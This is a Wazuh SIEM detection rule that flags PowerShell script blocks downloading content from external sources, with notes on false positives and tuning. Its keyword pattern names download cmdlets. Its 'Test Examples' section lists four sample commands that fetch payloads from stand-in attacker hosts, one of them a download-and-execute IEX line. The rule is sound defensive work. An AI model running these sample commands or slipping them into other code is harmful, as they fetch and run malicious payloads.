<!--
  Wazuh Rule: Suspicious PowerShell Download Activity
  ID: 100058
  Level: 10 (High)
  Description: PowerShell downloading files from external sources
  Author: HawkinsOps SOC
  Date: 2025-11-18
-->

<group name="windows,powershell,">
  <rule id="100058" level="10">
    <if_sid>91804</if_sid>
    <field name="win.eventdata.scriptBlockText">DownloadFile|DownloadString|Invoke-WebRequest|wget|curl|iwr|Net.WebClient</field>
    <description>PowerShell downloading content from external source</description>
    <mitre>
      <id>T1059.001</id>
    </mitre>
    <group>powershell_download,command_and_control,</group>
  </rule>
</group>

<!--
Summary:
  Detects PowerShell script block logging events showing file download operations
  using various cmdlets and .NET methods commonly used in malicious scripts.

Fields Used:
  - win.eventdata.scriptBlockText: PowerShell command content
  - win.eventdata.path: Script file path (if applicable)
  - win.system.computer: Source hostname
  - win.system.user: User executing PowerShell

False Positives:
  - Legitimate administrative scripts
  - Software update mechanisms
  - Automated deployment tools
  - IT automation workflows

Severity: High (10)

MITRE ATT&CK: T1059.001 - PowerShell

Log Sources:
  - Windows PowerShell Event 4104 (Script Block Logging)
  - Microsoft-Windows-PowerShell/Operational
  - Enhanced PowerShell logging

Test Examples:
  - (New-Object Net.WebClient).DownloadFile('http://evil.com/malware.exe','C:\temp\malware.exe')
  - Invoke-WebRequest -Uri http://c2.com/payload -OutFile payload.exe
  - IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/script.ps1')
  - wget http://malicious.com/tool.exe -OutFile tool.exe

Tuning Notes:
  - Whitelist known update/download sources by URL pattern
  - Correlate with network connection logs
  - Check destination file paths for suspicious locations
  - Monitor for execution of downloaded files
  - Enable PowerShell script block logging
  - Track download followed by immediate execution
  - Inspect URLs against threat intelligence feeds
-->
